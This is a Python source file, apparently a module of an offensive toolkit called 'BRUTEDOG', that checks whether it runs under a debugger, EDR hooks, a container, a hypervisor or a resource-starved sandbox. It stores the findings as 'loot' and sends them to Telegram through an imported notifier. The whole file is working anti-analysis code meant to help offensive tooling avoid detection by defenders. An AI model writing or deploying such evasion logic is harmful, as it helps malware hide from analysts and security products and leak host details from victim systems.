#!/usr/bin/env python3
"""
SANDBOX_EVADER.PY v8.6 — Active Sandbox, Honeypot, EDR & Debugger Evasion Engine (Elite Red Team Adversarial Edition)
Features:
- Hypervisor and container artifact detection (Docker, QEMU, VirtualBox, VMware, LXC)
- Debugger, instrumentation hook, and EDR monkey-patching detection (sys.gettrace, function pointer inspection)
- Behavioral timing-acceleration checks & CPU/RAM resource constraints auditing
- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic reports
- Real-time zero-delay proof-of-work terminal streaming & unredacted Telegram telemetry broadcasting
"""
import sys
import os
import time
import platform
import asyncio
import hashlib
import json

# Import centralized framework loot exfiltration, telemetry, behavioral mimicry, and Telegram notifier
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof
from modules.telegram_notifier import send_telegram_alert
from modules.behavioral_mimic import apply_behavioral_jitter

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "CYAN": "\033[96m",
    "MAGENTA": "\033[95m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m",
}

def terminal(message):
    sys.stdout.write(message + "\n")
    sys.stdout.flush()

async def broadcast_tg_alert_async(loot_type, details):
    try:
        await send_telegram_alert(loot_type, details)
    except Exception:
        pass

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from sandbox evader functions."""
    try:
        loop = asyncio.get_running_loop()
        if loop.is_running():
            loop.create_task(broadcast_tg_alert_async(loot_type, details))
        else:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass

class SandboxEvader:
    """
    Active Environment Inspector & Sandbox Detection Engine.
    Identifies analysis sandboxes, debuggers, EDR hooks, and honeypots before executing sensitive offensive operations.
    """
    def __init__(self):
        self.evasion_triggered = False
        self.indicators = []

    def check_debugger(self):
        """Detects active Python debuggers, tracing hooks, and EDR function monkey-patching."""
        is_traced = sys.gettrace() is not None
        if is_traced:
            self.indicators.append("Active debugger trace detected (sys.gettrace)")
            return True

        # Check for standard library hooking (common in EDR Python monitoring agents)
        try:
            import urllib.request
            if not urllib.request.urlopen.__name__ == "urlopen":
                self.indicators.append("Detected possible function hook/monkey-patching on urllib.request.urlopen")
                return True
        except Exception:
            pass

        return False

    def check_timing_acceleration(self):
        """Detects if CPU execution is being time-accelerated by a sandbox emulator."""
        try:
            start_time = time.perf_counter()
            # Brief computational delay
            _ = [i ** 2 for i in range(100_000)]
            elapsed = time.perf_counter() - start_time
            
            # If execution is abnormally fast, it could indicate emulator skipping/acceleration
            if elapsed < 0.0001:
                self.indicators.append(f"Abnormal timing acceleration detected ({elapsed:.6f}s)")
                return True
        except Exception:
            pass
        return False

    def check_container_artifacts(self):
        """Inspects for containerization and hypervisor artifacts."""
        artifacts = []
        
        # Check docker env file or .dockerenv
        if os.path.exists("/.dockerenv") or os.path.exists("/runenv"):
            artifacts.append("Found container marker (/.dockerenv)")

        # Check cgroups for container signatures
        try:
            if os.path.exists("/proc/self/cgroup"):
                with open("/proc/self/cgroup", "r", encoding="utf-8") as f:
                    content = f.read()
                    if any(sig in content for sig in ["docker", "kubepods", "lxc", "containerd", "podman"]):
                        artifacts.append("Container signature found in /proc/self/cgroup")
        except Exception:
            pass

        # Check CPU / Hypervisor vendor strings on Linux
        try:
            if os.path.exists("/proc/cpuinfo"):
                with open("/proc/cpuinfo", "r", encoding="utf-8") as f:
                    content = f.read().lower()
                    for hv in ["vmware", "qemu", "kvm", "virtualbox", "xen", "hyperv"]:
                        if hv in content:
                            artifacts.append(f"Hypervisor signature in cpuinfo: {hv}")
        except Exception:
            pass

        if artifacts:
            self.indicators.extend(artifacts)
            return True
        return False

    def check_resource_constraints(self):
        """Checks if system resources match typical bare-minimum analysis sandboxes."""
        constraints = []
        
        # CPU Count check
        cpu_count = os.cpu_count() or 1
        if cpu_count <= 1:
            constraints.append(f"Low CPU core count: {cpu_count}")

        # Memory / RAM check (Linux /proc/meminfo)
        try:
            if os.path.exists("/proc/meminfo"):
                with open("/proc/meminfo", "r", encoding="utf-8") as f:
                    for line in f:
                        if "MemTotal" in line:
                            parts = line.split()
                            if len(parts) >= 2:
                                kb_total = int(parts[1])
                                if kb_total < 2_097_152: # Less than 2GB RAM
                                    constraints.append(f"Low RAM constraint: {kb_total // 1024} MB")
        except Exception:
            pass

        if constraints:
            self.indicators.extend(constraints)
            return True
        return False

    def inspect_environment(self):
        """Performs full spectrum sandbox, EDR, and debugger inspection."""
        terminal(f"{COLORS['MAGENTA']}[*] Executing elite sandbox & analysis environment inspection...{COLORS['RESET']}")
        
        apply_behavioral_jitter()
        
        dbg = self.check_debugger()
        tmg = self.check_timing_acceleration()
        cnt = self.check_container_artifacts()
        res = self.check_resource_constraints()

        analysis_detected = dbg or tmg or cnt or res

        report = {
            "analysis_environment_detected": analysis_detected,
            "debugger_active": dbg,
            "timing_anomaly": tmg,
            "container_artifacts": cnt,
            "resource_constraints": res,
            "indicators": self.indicators,
            "platform": platform.platform()
        }

        if analysis_detected:
            terminal(f"{COLORS['RED']}[!] WARNING: Analysis sandbox, EDR, or debugger environment detected!{COLORS['RESET']}")
            for ind in self.indicators:
                terminal(f"  └── Indicator: {ind}")
            
            report_str = json.dumps(report)
            loot_hash = hashlib.sha256(report_str.encode("utf-8")).hexdigest()
            report["integrity_hash"] = loot_hash

            # Broadcast telemetry to Telegram and persist loot immutably
            broadcast_tg_alert_sync("Sandbox / Analysis Environment Detected", report)
            stream_proof("SANDBOX_DETECTED", "local_runtime", {}, f"Indicators: {len(self.indicators)}", report)
            save_session_loot(
                target="localhost",
                endpoint="sandbox_inspection",
                finding_type="SANDBOX_ENVIRONMENT_DETECTED",
                status=200,
                headers={},
                body=report_str,
                extra_loot=report
            )
        else:
            terminal(f"{COLORS['GREEN']}[+] Environment clean. No active debugging, EDR hooks, or sandbox signatures found.{COLORS['RESET']}")

        return report

async def run_sandbox_evader():
    terminal(f"\n{COLORS['CYAN']}[***] BRUTEDOG SANDBOX & DEBUGGER EVASION ENGINE (V8.6) [***]{COLORS['RESET']}")
    evader = SandboxEvader()
    report = await asyncio.to_thread(evader.inspect_environment)
    return report

if __name__ == "__main__":
    asyncio.run(run_sandbox_evader())
